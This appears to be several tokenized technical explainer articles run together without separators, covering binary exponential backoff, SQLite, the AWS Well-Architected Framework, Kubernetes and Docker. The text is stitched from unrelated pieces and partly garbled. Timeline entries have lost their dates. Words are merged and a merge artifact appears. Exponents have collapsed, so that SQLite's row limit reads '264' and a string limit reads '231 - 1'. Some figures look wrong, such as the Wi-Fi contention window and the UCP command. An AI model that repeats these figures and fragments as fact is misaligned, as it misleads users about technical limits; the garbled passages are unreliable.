BEB was initially proposed for computer networking where multiple computers share a single medium or channel .
It 's most famously used in Ethernet and Wi - Fi networking standards .
Where is binary exponential backoff useful ?
BEB is most useful in distributed systems without centralized control or systems that lack predetermined resource allocation .
In such systems , multiple entities attempt to access a shared resource .
Because there 's no centralized control , whoever manages to grab the resource before anyone else will be allowed to use it .
Others have to wait for their turn .
The problem is that when the resource becomes available , everyone else will attempt to grab it .
This results in delays .
Entities spend time trying to resolve the confusion .
Resource utilization is therefore not optimal .
The problem gets worse when many entities ( dozens or hundreds ) are involved .
BEB is an algorithm that mitigates this problem .
BEB is therefore useful in probabilistic systems .
It 's not useful in deterministic systems where the resource is allocated by a controller . Each entity knows its turn and will use the resource at specific times and durations as allocated .
Could you explain how BEB works ?
Illustrating collision and backoff .
Source : Park 2018 , pp .
6 .
Consider Wi - Fi as an example .
Two Wi - Fi stations , Sue and Mira , wanted to send data to Arnold .
When the stations access the channel at the same time , we say that it 's a collision .
Stations whose packets have just collided will initiate a backoffprocedure.$MERGE_SPACE $MERGE_SPACE
Every station maintains a number called Contention Window ( CW ) .
The station will choose a random value within this window .
This value , which is really the number of idle transmission slots that the station has to wait for , is called the Backoff Period .
During this period , these stations ( Sue and Mira ) can not transmit .
The essence of BEB is that the backoff period is randomly selected within the CW .
Each station will potentially have a different waiting time .
They ca n't transmit until the backoff period has passed .
Moreover , when another station gains access , backoff timer is paused .
It 's resumed only when the channel becomes idle again as determined by Distributed Interframe Space ( DIFS ) .
With every collision , the station will double its CW .
This is why the prefix " binary exponential " is used .
It 's common to have minimum and maximum values for CW .
Could you share some facts or details about BEB ?
Some problems with BEB .
Source : Ho et al .
2001 , slide 23 .
BEB does n't eliminate collisions .
By staggering the channel access due to random backoff , it reduces the probability of collision .
It 's possible that two nodes that collide may backoff the same amount and collide again when they retry .
Collisions can also happen with nodes that collided long ago and whose backoff just completed .
It may be argued that randomizing the backoff with every attempt is enough to lower the collision probability .
Why do we need to double the contention window ( CW ) ?
This is because new packets are getting generated and need to be transmitted in addition to collided packets .
If CW is not increased , we 'll have network congestion with more nodes vying for the channel at the same time .
However , doubling the CW is not optimal when the network load is low .
Often the minimum CW is non - zero , so that retrying nodes backoff at least some amount before retrying .
Likewise , there 's a maximum CW so that nodes are not starved due to long backoff periods .
What are some well - known applications of BEB ?
BackofftimesbetweenTCPretransmissionsdouble with each attempt .
Source : Ye 2017 .
The Medium Access Control ( MAC ) layer of networking protocols uses BEB .
For example , both Ethernet and Wi - Fi use Truncated BEB to set the contention window .
Actual backoff is selected randomly within the contention window .
Due to this randomization , the term Randomized Exponential Backoff is sometimes used .
The Transmission Control Protocol ( TCP ) is a protocol that guarantees packet delivery by acknowledging correctly received packets .
If acknowledgements are not received , the sender will retransmit the packet .
Immediate retransmission can potentially congest the network .
Hence , the sender uses BEB before retransmitting .
On a mobile ad hoc network , routes are discovered when required .
It 's possible for an attacker to flood the network with Route Request ( RREQ ) packets .
One defence against this is BEB .
RREQ packets that are seen too soon ( not obeying BEB backoffs ) are dropped .
In network applications , when a request fails due to contention , BEB with jitter is used for retries .
Examples include access to AWS DynamoDB , or Google Cloud Storage .
In general , BEB and its variants are used in wired / wireless networks , transactional memory , lock acquisition , email retransmission , congestion control and many cloud computing scenarios .
What metrics are useful to measure the performance and stability of BEB ?
The following metrics are commonly used : Throughput : This is the number of packets per second successfully sent over the channel .
The algorithm is considered stable if the throughput does not collapse as the offered load goes to infinity .
Offered load can be defined as the number of nodes waiting to transmit or total packet arrival rate relative to channel capacity .
Delay : Nodes that experience a collision , backoff and return later .
Delays increase as the channel experiences more packet collisions .
An algorithm is considered stable if the delay is bounded .
Call Count : This is the average number of retries needed to achieve a successful transmission .
Other metrics useful during analysis include the probability of collision \(p_c\ ) and the probability that a node will transmit in an arbitrary time slot \(p_t\ ) .
Sometimes BEB is generalized to exponential backoff , with a backoff factor \(r\ ) .
With BEB , \(r\ ) is set to 2 .
It 's been shown that the optimum backoff factor that maximizes asymptotic throughput is \(1/(1-e^{-1})\ ) .
What 's the Capture Effect that occurs with BEB ?
The Capture Effect points to a lack of fairness for channel access .
Nodes that experience collisions will be in their backoff procedures .
New nodes entering the system have a higher chance of capturing the channel .
These new nodes can therefore transmit long sequences of packets while others are waiting for their backoffs to end .
Even if old and new nodes collide , newer nodes will have shorter backoffs and will therefore gain access more quickly .
Capture effect has been studied for the Ethernet scenario .
It was found that the effect is severe for small number of nodes and improves as more nodes compete for the channel .
One proposed solution is to use Capture Avoidance Binary Exponential Backoff ( CABEB ) .
The capture effect is different from the starvation effect .
With starvation , some nodes have little chance to transmit while most are able to transmit .
With capture effect , a few nodes occupy the channel most of the time .
What are some variations of BEB ?
Adding jitter reduces repeated collisions .
Source : Brooker 2015 .
By definition , BEB simply doubles the backoff with every collision .
So two nodes that collide with their first attempt will most likely collide again since their retries coincide .
For this reason , an element of randomness is added to the backoff .
This could be termed as jitter .
Alternatively , nodes could select a random slot within the contention window as standardized on Ethernet or Wi - Fi .
In a modified BEB , each successive slot will be selected with a probability of \(1/2^i\ ) after \(i\ ) collisions .
This means that the next retry could potentially happen after \(2^i\ ) slots .
With Truncated BEB , a maximum backoff time is defined so that nodes that experience lots of collisions do n't end up waiting longer and longer .
However , there may be a limit to the maximum number of retries .
On Wi - Fi , CW is in the range [ 23 , 1023 ] .
Other variations include continuously listening to the channel and modifying the backoff ; tuning the CW based on slot utilization and collision count ; increasing the CW with every alternate collision .
Norman Abramson proposes the use of a shared broadcast channel for the ALOHA system .
This system would use radio communications to connect computers of the University of Hawaii spread across the islands of Hawaii .
The system came into operation in June 1971 .
The design of ALOHA did n't define any backoff since it was assumed that both new and retransmitted packets would arrive according to a Poisson process .
Simulation results show that throughput depends on K. Source : Lam 1973 , fig .
1 .
Leonard Kleinrock and Simon S. Lam propose the first backoff algorithm for multiple access in slotted ALOHA .
A uniform random retransmission delay over K slots is proposed .
Channel throughput increases with K , but when K goes to infinity , channel throughput approaches 1 / e .
In July , Lam showed that with fixed K backoff , slotted ALOHA is unstable .
This suggests that K has to be adaptive .
Simon S. Lam and Leonard Kleinrock propose an adaptive backoff algorithm called Heuristic RCP ( Retransmission Control Procedure ) .
The idea is to adapt K based on the number of collisions ( m ) a packet has experienced .
If K increases steeply with respect to m , channel saturation wo n't happen .
Binary exponential backoff is a special case of Heuristic RCP where \(K=2^m\ ) .
High priority traffic is given to smaller interframe spacing and contention windows .
Source : Cisco 2017 , fig .
2 - 8 .
IEEE publishes IEEE 802.11e , an amendment to the 802.11 standard .
This specifies Quality of Service ( QoS ) enhancements at the MAC layer .
It proposes a feature named Enhanced Distributed Channel Access ( EDCA ) .
Traffic is categorized by type into an Access Category ( AC ) .
Each AC has its own interframe spacing , and minimum and maximum values for the contention window .
This is the way traffic is prioritized towards channel access .
SQLite logo .
Source : Wikipedia 2019 .
Traditional databases are often difficult to setup , configure and manage .
This includes both relational databases ( MySQL , Oracle , PostgreSQL ) and NoSQL databases ( MongoDB ) .
What if you needed a simple database to manage data locally within your application ?
What if you do n't need to manage remote data across the network ?
What if you do n't have lots of clients writing to the database at the same time ?
This is where SQLite offers a suitable alternative .
SQLite is an in - process library that implements a self - contained , serverless , zero - configuration , transactional SQL database engine .
It 's open source .
The library is compact , using only 600KiB with all features enabled .
It can work even in low - memory environments at some expense of performance .
It 's even faster than direct filesystem I / O. The database is stored as a single file .
How 's SQLite different from traditional databases ?
SQLite does n't need a server and the database is just a file .
Source : Kreibich 2010 , sec .
1.1 .
Traditional databases are based on the client - server architecture .
Database files are not directly accessed by client applications but via a database server .
SQLite takes a different approach .
There 's no server involved .
The entire database – all tables , indices , triggers , views – is stored in a single file .
By eliminating the server , SQLite eliminates complexity .
There 's no need for multitasking or inter - process communication support from the OS .
SQLite only requires reading / writing to some storage .
Taking backup is just a file - copy operation .
The file can be copied to any other platform , be it 32-bit , 64-bit , little - endian or big - endian .
While SQLite does n't adopt a client - server architecture , it 's common to call applications that read / write to SQLite databases as " SQLite clients " .
What are the use cases where SQLite is a suitable database ?
For embedded devices , particularly for resource - constrained IoT devices , SQLite is a good fit .
It has a small code footprint , uses memory and disk space efficiently , is reliable and requires little maintenance .
Because it comes with a command line interface , it can be used for analysis of large datasets .
Even in enterprises , SQLite can stand in for traditional databases for testing , for prototyping or as a local cache that can make the application more resilient to network outages .
Using SQLite directly over a networked file system is not recommended .
It can still be used for web applications if managed by a web server .
It 's suited for small or medium websites that receive less than 100 K hits / day .
Applications can use SQLite instead of file access commands such as ` fopen ` , ` fread ` and ` fwrite ` .
These commands are often used to manage various file formats such as XML , JSON or CSV , and there 's a need to write parsers for these .
SQLite removes this extra work .
Because SQLite packs data efficiently , it 's faster than these commands .
It 's been noted that SQLite does not compete with client / server databases .
SQLite competes with fopen ( ) .
Where should n't I use SQLite ?
SQLite is not suitable for large datasets , such as exceeding 128 TiB. It 's also not suited for high - volume websites , particularly for write - intensive apps .
SQLite supports concurrent reading but writing is serialized .
Each writing typically locks database access for a few dozen milliseconds .
If more concurrency is desired due to many concurrent clients , SQLite is not suitable .
If a server - side database is desired , traditional databases such as MS SQL , Oracle or MySQL have intrinsic support for multi - core and multi - CPU architectures , user management and stored procedures .
How 's the adoption of SQLite ?
It 's been claimed that SQLite is the most widely deployed database in the world with over one trillion database instances worldwide .
It 's present on every Android device , every iOS device , every Mac device , every Windows 10 device , every Firefox / Chrome / Safari browser , every Skype / Dropbox / iTunes client , and most set - top boxes and television sets .
Going by DB - Engines Ranking that 's updated month , in January 2019 , SQLite was seen in tenth position .
Some users of SQLite include Adobe , Airbus , Apple , Bentley , Bosch , Dropbox , Facebook , General Electric , Google , Intuit , Library of Congress , McAfee , and Microsoft .
What tools are available for working with SQLite ?
SQLite comes with a command line interface ( CLI ) called ` sqlite3 ` to create , modify and query an SQLite database .
Another useful CLI tool is ` sqlite3_analyzer ` that tells about memory usage by tables and indices .
For those who prefer a graphical user interface ( GUI ) , there are a number of utilities : SQLite Database Browser , SQLite Studio , SQLite Workbench , TablePlus , Adminer , DBeaver , DbVisualizer and FlySpeed SQL Query .
Most are free and cross - platform with lots of useful features .
DbVisualizer has Free and Pro editions .
Navicat for SQLite is a paid product .
Adminer is implemented in a single PHP file to be executed by a web server .
To embed SQLite into your own application , there are dozens of language bindings , including C , C++ , PHP , Python , Java , Go , MATLAB , and many more .
SQLite 's inventor noted that it was designed from the beginning to be used with Tcl .
Tcl bindings have been present even before version 1.0 and regression tests are written in Tcl .
What 's the architecture of SQLite ?
Architecture diagram of SQLite .
Source : SQLite 2019 g .
SQLite compiles SQL statements into bytecode , which runs on a virtual machine .
To generate the bytecode , SQL statements go via the tokenizer ( identify tokens ) , parser ( associate meaning to tokens based on context ) and finally to the code generator ( generate the bytecode ) .
SQLite itself is implemented in C. SQL functions are implemented as callbacks to C routines .
In terms of lines of code , the code generator is the biggest , followed by the virtual machine .
The database itself is organized as a B - Tree .
Each table and index has a separate tree but all trees are stored on the same file .
Information from the disk is accessed at a default page size of 4096 bytes .
The Pager does the reading , writing and caching .
It also does rollback , atomic committing and locking of the file .
How 's the performance of SQLite ?
SQLite is 35 % faster than filesystem I / O. When holding 10 KB blobs , an SQLite file uses 20 % less disk space .
In one study , SQL CE 4.0 was compared against SQLite 3.6 .
SQLite fared slightly better for reading operations , but for everything else , SQL CE was significantly faster .
However , the hardware was a Dell Workstation with two Intel Xeons and 8 GB of RAM .
When compared against Realm , SQLite performed better with inserts but with counts and queries , Realm was faster .
In the Python environment , one study compared ` pandas ` with ` sqlite ` .
SQLite is used in two variants : file database and in - memory database .
SQLite performed better with select , filter and sort operations .
Pandas did better with group - by , load and join operations .
There was no great performance gain with in - memory SQLite as compared to file - based SQLite .
What are the limits and limitations of SQLite ?
Limits are documented on the SQLite 's official website .
We mention a few of them : the maximum database size is 128 TiB or 140 TB .
The maximum number of tables in a schema is 2147483646 .
A maximum of 64 tables can be used in a JOIN .
The maximum number of rows in a table is 264 .
The maximum number of columns in a table / index / view is 1000 but can be increased to 32767 .
The maximum string / BLOB length is 1 billion bytes by default , but this can be increased to 231 - 1 .
The maximum length of an SQL statement is 1 million bytes but can be increased to 1073741824 .
SQLite implements SQL with some omissions .
For example , RIGHT OUTER JOIN and FULL OUTER JOIN are not supported .
There 's partial support for ALTER TABLE .
GRANT and REVOKE commands are not supported .
This implies there 's no user management support .
BOOLEAN and DATETIME are examples of data types missing in SQLite .
AUTOINCREMENT does n't work the same way as in MySQL .
SQLite has a flexible type system ( string can be assigned to an integer column ) , but from the viewpoint of static typing , this can be seen as a limitation .
Version 1.0 of SQLite has been released .
The earliest public release of the alpha code dates back to May 2000 .
D. Richard Hipp created SQLite from a need to have a database that did n't need a database server or a database administrator .
The syntax and semantics are based on PostgreSQL 6.5 .
Version 2.0.0 of SQLite has been released .
While 1.0 was based on GNU Database Manager ( gdbm ) , 2.0.0 uses a custom B - tree implementation .
Support for in - memory database is added in version 2.8.1 .
This is useful when performance is important and data persistence is not required .
Data is lost when the database connection is closed .
Version 3.0.7 of SQLite has been released .
An alpha release of 3.0.0 was available earlier in June 2004 .
Conn2 and Conn3 shared a single cache .
Source : SQLite 2019j , fig .
1 .
In version 3.3.0 , a shared - cache mode is introduced in which multiple connections from the same thread can share the same data and schema cache .
This reduces IO access and memory requirements .
In version 3.5.0 ( September 2007 ) , this is extended to an entire process rather than just a thread .
Python standard library version 2.5 includes SQLite under the package name ` sqlite3 ` .
Syntax diagram for ALTER TABLE statement .
Source : SQLite 2019p .
From version 3.6.4 , SQLite language syntax is described as syntax diagrams rather than BNF notation .
Version 3.26.0 of SQLite has been released .
Cloud platforms offer a number of services .
A typical application can use one or more of these services , each of which can be configured in a number of different ways .
Applications deployed on dedicated on - premise servers usually need to be re - architected before migrating to the cloud .
Each application is different and therefore , deploying an application to the cloud is usually not a trivial task .
Amazon Web Services ( AWS ) is one of the big cloud platforms .
The AWS Well - Architected Framework ( WAFR ) offers a set of guidelines and best practices to help practitioners migrate , manage and optimize their applications and their operations on the AWS cloud .
By adopting this framework , we can build and deploy faster , lower or mitigate risks , make informed decisions , and learn AWS best practices .
What exactly does the AWS Well - Architected Framework ( WAFR ) provide ?
The framework is made of pillars , design principles and questions .
Pillars are foundational to produce stable and efficient systems .
By paying attention to these pillars , we can meet expectations and requirements .
Moreover , we can focus on our applications and their functional requirements rather than fighting infrastructure issues .
For each pillar , the framework lists a number of design principles .
For a practitioner , the framework is a set of foundational questions that will allow you to measure your architecture against these best practices and to learn how to address any shortcomings .
Once shortcomings are identified , along with possible solutions , how much and how quickly you implement these will depend on the complexity of the task and the required skill sets .
What are the five pillars of AWS Well - Architected Framework ( WAFR ) ?
Five pillars of WAFR .
Source : Singh 2018 , slide 9 .
There are five pillars : Operational Excellence : Align with business objectives .
Give alerts and respond to them in an automated manner .
Perform operations with code .
Make incremental changes .
Learn from failures .
Test for responses to unexpected events .
Document current procedures .
Security : Protect information , systems and assets .
Do risk assessments .
Have mitigation strategies .
Secure at all layers .
Enable traceability .
Implement the principle of least privilege .
Automate best practices .
Areas include Identity and Access Management ( IAM ) , detective controls , infrastructure protection , data protection , and incident response .
Reliability : Automatically recover from infrastructure or service disruptions .
Test recovery procedures .
Scale horizontally to increase availability .
Stop guessing capacity .
Choose instance type based on application needs .
Use multiple availability zones .
Performance Efficiency : Make efficient use of resources .
Enable latency - based routing .
Adopt the latest technologies and architectures .
Experiment more often .
Cost Optimization : Avoid unneeded costs .
Assess resource utilization .
Analyze and attribute expenditure .
Match supply and demand .
Optimize over time .
Delete unused resources .
Use consolidated billing , spot instances , and reserved instances .
Rightsize before / after migration .
Which AWS services can help in implementing WAFR ?
Here we mention a few of them without being exhaustive : Operational Excellence : Services are available in areas of preparation , operations , responses .
AWS Developer Tools , RunCommand , AWS Batch , AWS CloudFormation and AWS Config can be used in all three areas .
Use AWS CloudTrail and AWS CloudWatch for operations and responses .
Security : IAM , MFA Token , Amazon VPC , AWS CloudFormation , AWS Config , AWS CloudTrail , AWS CloudWatch , Elastic Load Balancing , Amazon S3 , Amazon RDS , and AWS Key Management Service are some services to use .
Reliability : Use AWS CloudFormation and Multi - AZ for failure management .
For change management , use Auto Scaling .
Performance Efficiency : Use AWS Lambda instead of running EC2 instances .
Use Amazon CloudFront and Route 53 to reduce latency .
Cost Optimization : Release Elastic IPs , EBS volumes or RDS instances if not attached to other services .
Move archived data from S3 to Glacier .
Use EC2 Scheduler to automatically manage start / stop of instances .
Use AWS CloudFormation to automate and save time .
Amazon SNS can help with expenditure awareness .
Use reserved / spot instances .
Use AWS GuardDuty for low - cost security monitoring .
What are the design principles and best practice areas within WAFR ?
Pillar - specific design principles and best practice areas of AWS Well - Architected Framework .
Source : awsvinlabs 2017 .
While there are design principles specific to each pillar , some general principles include the following : Stop guessing your capacity needs Test systems at production scale Automate to make architectural experimentation easier Allow for evolutionary architectures Build data - driven architectures Improve through game days A blog article online explains the above and cites relevant AWS services for each .
Could you share some user stories that show the benefits of applying WAFR ?
At National Instruments , they migrated existing products to the Well - Architected Framework .
Source : DiLauro and Gardner 2016 , slide 38 .
National Instruments started developing on AWS in 2008 .
In 2013 , they started adopting the AWS Well - Architected Framework .
Since 2015 , all their cloud products have followed the framework .
Once they adopted the framework , their scaling latency dropped from 30 minutes to 5 minutes ; they optimized from overprovisioning ; they removed dependency on data center ; and increased developer efficiency .
Before adopting the framework , it took too long to deploy code and scale operations .
Since there was n't much automation , manual intervention was high and operators suffered from alert fatigue .
For better security , they adopted IAM rather than giving using a Root API key .
Their roadmap includes multi - region disaster recovery .
Among the tools they used or they plan to use are CloudTrail , Amazon Inspector , AWS WAF , AWS Certificate Manager , AWS Config , CloudFormation , Elastic Load Balancing , VPC , CloudFront , Route 53 , Multi - AZ , and more .
Could you name some AWS partners or firms offering consulting on AWS Well - Architected Framework ?
There are many vendors providing managed services for AWS .
Some of them are recognized by AWS as Well - Architected Review partners .
These partners typically ask questions to evaluate your architecture in terms of the framework and suggest ways to improve on the five pillars .
A small sample of such partners include BJSS , Contino , Endava , Foghorn Consulting , Idexcel , KCOM , Logicworks , nClouds , Onica , Piksel Group , Relium , Steamhaus , Telefonica , and Version1 .
Within the AWS Principal Engineering community , an initiative called Well - Architected has started .
The aim is to share with customers best practices for architecting in the cloud .
In a blog post , the AWS Well - Architected Framework is announced .
The author asks , " Have you chosen a cloud architecture that is in alignment with the best practices for the use of AWS ?
" The framework consists of four pillars .
Enterprise Support customers get access to a Well - Architected Review for business critical workloads .
This review , delivered by an AWS Solutions Architect , provides guidance and best practices to design reliable , secure , efficient , and cost - effective systems in the cloud .
The framework introduces Operational Excellence as the fifth pillar .
At the AWS re : Invent event , the AWS Well - Architected Partner Program was launched .
Partners can use the principles and best practices of the framework to review a customer 's use of AWS services and guide them towards building secure , performant , and resilient infrastructure to support their applications .
The AWS blog reports the launch of the AWS Well - Architected Partner Program at re : Invent event .
At this time , there are more than 30 approved partners .
Kubernetes logo .
Source : Kubernetes GitHub 2016 .
A scalable application on the cloud is typically composed of many microservices running within containers .
When there are multiple containers running the workloads of multiple applications across machines , there 's a need to manage the containers .
This is where container orchestration comes in .
By automating container deployment , scaling , monitoring and recovery , developers can focus on code rather than operations .
Kubernetes is an open source container orchestrator .
The project is overseen by the Cloud Native Computing Foundation , a project of the Linux Foundation .
A shortform for Kubernetes is k8s .
Kubernetes is written in Go language .
Kubernetes can work with different container technologies such as Docker or rkt .
It can manage containers on clusters of physical or virtual machines .
Deployments can be on - site or across various cloud providers , and therefore there 's no vendor lock - in .
Why were Kubernetes invented in the first place ?
An introduction to Kubernetes .
Source : CoderJourney 2017 .
Internally , Google had been using containers for more than a decade before Kubernetes itself was born .
They used a cluster management system called Borg for managing hundreds of thousands of containers .
This infrastructure was used to power Google Compute Engine , but there was a problem .
Customers were simply spinning up virtual machines ( VMs ) , paying for them but using them well below capacity .
In other words , resources were not optimally utilized .
Engineers at Google realized that an open source variant of Borg was needed that everyone could use .
Containers themselves had been popularized by Docker , but managing even dozens of containers was becoming an operational challenge .
Kubernetes were therefore created in 2013 before Docker Swarm itself appeared the next year .
By making it easier to manage containers , tools like Kubernetes enable more widespread adoption of containers instead of VMs .
What are the key features of Kubernetes ?
When Kubernetes first came out , its basic feature set included replication , load balancing , service discovery , basic health checking , self - healing , and scheduling .
Current features of Kubernetes include the following : Service discovery and load balancing : Uses a single DNS name for a set of containers .
Jobs are load - balanced .
Automatic binpacking : Also called scheduling , containers are assigned to nodes based on resource requirements .
Mix critical and batch workloads in order to drive up utilization .
Storage orchestration : Support for various storage options .
Self - healing : Restart failed containers .
Reschedule containers when nodes die .
Automated rollouts and rollbacks : App changes are rolled out progressively without bringing down all instances at the same time .
If something goes wrong , rollback the changes .
Secret and configuration management : Update secrets without rebuilding image or exposing secrets in your stack configuration .
Batch execution : Manage batch and CI workloads .
Horizontal scaling : Also called replication , apps can be scaled up or down automatically based on CPU usage .
Could you define some common Kubernetes terminology ?
A Kubernetes glossary is available online , but here are some common terms : Cluster : A set of worker nodes and at least one master node managed by Kubernetes .
Controller : A control loop that watches and attempts to move the cluster to its desired state .
Deployment : An API object that manages a replicated application .
Each replica is a pod .
Label : Key - value pairs used to identify and organize Kubernetes objects such as pods .
Namespace : An abstraction used by Kubernetes to support multiple virtual clusters on the same physical cluster .
Node : Previously called minion , this is a worker machine that can be virtual or physical .
It has services ( such as Docker ) to run pods .
Pod : The smallest and simplest Kubernetes object , it 's a set of running containers on your cluster .
ReplicaSet : Ensures a specific number of instances of a pod is always running .
Service : An API object that describes how to access applications , such as a set of Pods , and can describe ports and load - balancers .
Selector : Allows users to filter a list of resources based on labels .
Volume : A directory containing data , accessible to the containers in a pod with data preserved across container restarts .
Could you describe the architecture of Kubernetes ?
Kubernetes architecture .
Source : Devopedia .
A Kubernetes cluster consists of at least one master plus a number of nodes .
The master consists of an API server , a scheduler and a controller .
Configuration and management is via API calls processed by the master .
Master also contains an ETCD key - value database to store the state of the cluster .
Overall , management of the cluster is with the master , but the real workhorses are the nodes .
Jobs are executed within containers .
One or more containers are combined into a single pod .
One or more pods are scheduled to run on a node .
Master schedules pods on nodes , not the containers themselves .
Scheduling is based on resource requirements .
When scheduled , the node pulls the required container image , invokes the container runtime on the node and launches the container .
An agent called kubelet runs on each node to manage containers .
Kubernetes essentially do three things : resource management , scheduling and load balancing .
Periodically , the controller obtains pod utilization and uses this to scale .
This scaling is transparent to clients since everything is exposed as services .
Why do we need pods when containers might be good enough ?
An example of two containers in a pod sharing storage .
Source : Kubernetes Docs 2018b .
While Kubernetes could have been designed to map containers directly to nodes , pods offer an extra level of abstraction to simplify container management .
Because there are different container implementations — Docker , rkt , LXD , Windows Containers — pods provide a unified interface .
Pods also encapsulate containers that closely depend on one another .
Each pod has an IP address and all its containers share the same port space .
Inter - process communication ( IPC ) and sharing storage across containers in the pod is also easy .
When a pod is scheduled , all its containers are scheduled .
One may argue , why not bundle them into a single container ?
This violates the " one process per container " principle .
Having multiple processes in a container makes it difficult to debug problems .
By using pods , if a container fails , it will be restarted while other containers in the pod remain unaffected .
It 's perfectly valid for a pod to have a single container .
An example use case of a multi - container pod is a main container plus a sidecar container .
The latter can be a log watcher or a data loader .
What are some criticisms of Kubernetes ?
Since Kubernetes manages the low - level details , if something is wrongly configured or things do n't work as expected , it can be difficult to find the root cause .
The Kubernetes dashboard provides limited information , though more detailed information is available via the command line interface .
High - level architecture of Borg .
Source : Verma et al .
2015 , fig .
1 .
Internal to Google , Borg is conceived and built for large scale cluster management .
The idea is to use resources at high utilization while running hundreds of thousands of jobs .
Borg is the system that goes on to power Google Cloud Platform and Google Compute Engine .
Details of Borg are not disclosed outside of Google until much later in 2015 .
Within Google , Omega was introduced as a successor to Borg .
From the experience of Borg and Omega , some Google engineers are thinking of building an open source container management system .
A prototype is built within three months .
The first public commit of Kubernetes code is made on GitHub .
A few days later , it was released to the world at DockerCon .
Version 1.0 of Kubernetes was released at the Open Source Convention ( OSCON ) .
With Kubernetes as its first project , Cloud Native Computing Foundation ( CNCF ) was founded .
KubeCon is organized in San Francisco as the first Kubernetes conference .
This is the year when Kubernetes goes mainstream with more conferences , developers and features .
The game Pokemon GO that became an international is powered by Kubernetes .
Windows Server Support arrives .
In May , v0.1.0 of minikube was released to deploy a single - node Kubernetes cluster on a VM locally .
This is the year when we see greater adoption of Kubernetes among enterprises .
By October , it 's possible for Docker containers to seamlessly use either Docker Swarm or Kubernetes .
Priority and preemption in Kubernetes .
Source : Salamat and Oppenheimer 2018 .
In Kubernetes 1.9 , as an alpha release , there 's support for pod priority and preemption .
High - priority workloads can thus scale faster than cluster autoscaler can add nodes .
This leads to better resource utilization , lower costs and better service levels for critical applications .
Kubernetes now support Containerd containers .
DigitalOcean offers Kubernetes as a hosted service .
Google offers its own Google Kubernetes Engine ( GKE ) .
Similar services from Microsoft and Amazon follow .
Docker architecture .
Source : van der Mersch 2016 .
A container is a standard unit of software that packages an application with all of its dependencies and libraries .
This makes it easy to deploy applications within containers regardless of hardware configuration or operating system .
Unlike virtual machines , containers use the host OS rather than bundling an OS with the application .
Docker is a container platform .
It provides a complete ecosystem of tools to build container images , pull these images from known registries , deploy containers , and manage or orchestrate running containers across a cluster of machines .
Docker has popularized container adoption .
Even the phrase " dockerize my app " has become common .
The word " Docker " usually refers to its engine .
The commercial offering is called Docker Enterprise .
There 's also the free community edition that 's simply called Docker Engine .
Docker was initially available on Linux but later became available on MacOS and Windows as well .
What are the benefits of using Docker ?
Memory consumption of VMs vs Dockers .
Source : Chaturvedi 2019 .
Docker provides a consistent runtime across all phases of a product cycle : development , testing , and deployment .
For example , if a development team has upgraded one dependency , other teams must also do the same .
If they do n't , the app may work during development but fail in deployment or work with unexpected side effects .
Docker overcomes this complexity by providing a consistent environment for your app .
Hence , it 's become essential for DevOps practice .
Docker containers are smaller in size and boot up faster compared to VMs .
They 're also more cost efficient since many more containers than VMs can run on a machine .
Docker is open source .
There 's freedom of choice since any type of application ( legacy , cloud native , monolithic , 12-factor ) can run in a Docker container .
Security is built into the Docker Engine by default .
It 's powered by some of the best components , such as the containerd .
There 's also a powerful CLI and API to manage containers .
Via certified plugins , we can extend the capabilities of the Docker Engine .
What do you mean by the term " Docker image " ?
A docker image is built in multiple layers .
Source : Kasireddy 2016 .
A Docker image is a read - only template from which containers are created .
Here 's a useful analogy : just as objects are instantiated from classes in object - oriented languages , Docker containers are instantiated from Docker images .
For example , your application may require an OS and runtimes such as Apache , Java or ElasticSearch .
All these can be bundled into a Docker image .
Thus , your app can have this exact runtime environment wherever it runs .
An image is built in multiple read - only layers .
At the bottom , we might have BOOTFS and OS base image such as Debian .
Higher layers could have custom software or libraries such as Emacs or Apache .
This layering mechanism makes it easy to build new images on top of existing images .
When an image gets instantiated into a running container , a thin writable layer is added on top , called the Container Layer .
This means that all changes go into the topmost layer .
In fact , the underlying file system does n't make a copy of the lower layers since they are read - only .
This helps us bring up containers quickly .
How do developers share Docker images ?
Dissecting the full URL as specified with the Docker client .
Source : McCarty 2018 .
A remote location where docker images are stored is called the Docker Registry .
Images are pulled from and new images are pushed to the registry .
Without registries , it would be difficult to share and reuse images across projects .
There are many registries online and Docker Hub is the default one .
Just as developers share code via GitHub , Docker images are shared via Docker Hub .
Besides Docker Hub , there are some other registries : Gitlab , Quay , Harbor , and Portus .
Registries from cloud providers include Amazon Elastic Container Registry , Azure Container Registry , and Google Container Registry .
A collection of images with the same name but different tags is called Docker Repository .
A tag is an identifier for an image .
For example , " Python " is the name of the repository but when we pull the image " Python:3.7-slim " , we refer to the image tagged with " 3.7-slim " .
In fact , it 's possible to pull it by mentioning only the repository name .
A default tag ( such as " latest " ) will be used and only that image will be pulled .
Thus , these two commands are equivalent : ` docker pull rhel7 ` or ` docker pull registry.access.redhat.com / rhel7 : latest ` .
Which are the essential components of the Docker ecosystem ?
A selection of Docker logos .
Source : Adapted from Janetakis 2017 .
The Docker Engine is a client - server app with two parts : the Docker Client and the Docker Daemon .
Docker commands are invoked using the client on the user 's local machine .
These commands are sent to a daemon , which is typically running on a remote host machine .
The daemon acts on these commands to manage images , containers and volumes .
Using Docker Networking , we can connect Docker containers even if they 're running on different machines .
What if your app involves multiple containers ?
This is where Docker Compose is useful .
This can start , stop or monitor all services of the app .
What if you need to orchestrate containers across many host machines ?
The Docker Swarm allows us to do this , basically manage a cluster of Docker Engines .
Docker Machine is a CLI tool that simplifies creation of virtual hosts and instals Docker on them .
Docker Desktop is an application that simplifies Docker usage on MacOS and Windows .
Among the commercial offerings are Docker Cloud , Docker Data Center and Docker Enterprise Edition .
Which are the command - line interfaces ( CLIs ) that Docker provides ?
Since Docker has many components , there are also multiple CLIs : Docker CLI : This is the basic CLI used by Docker clients .
For example , ` docker pull ` is part of this CLI with " pull " being the child command .
These commands are invoked by users using the Docker Client .
Commands are translated into Docker API calls that are sent to the Docker Daemon .
Docker Daemon CLI : The Docker Daemon has its own CLI , which is invoked using the ` dockerd ` command .
For example , the command ` $ sudo dockerd -H tcp://127.0.0.1:2375 -H unix:///var / run / docker.sock & ` asks the daemon to listen to both TCP and a Unix socket .
Docker Machine CLI : This is invoked with the command ` docker - machine ` .
Docker Compose CLI : This is invoked with the command ` docker - compose ` .
This uses Docker CLI under the hood .
DTR CLI : Invoked with ` docker / dtr ` , this is the CLI for Docker Trusted Registry ( DTR ) .
UCP CLI : Invoked with ` docker / dtr ` , this is the CLI for installing and managing the Docker Universal Control Plane ( UCP ) on a Docker Engine .
What are Volumes in Docker and where are they useful ?
Containers are meant to be temporary .
Any changes made to it at runtime are usually not saved .
Sometimes we may save the changes into a new image .
Otherwise , changes are discarded .
However , there 's merit in saving data or state so that other containers can use them .
Volumes are therefore used for persistent storage .
A volume is a directory mounted inside a container .
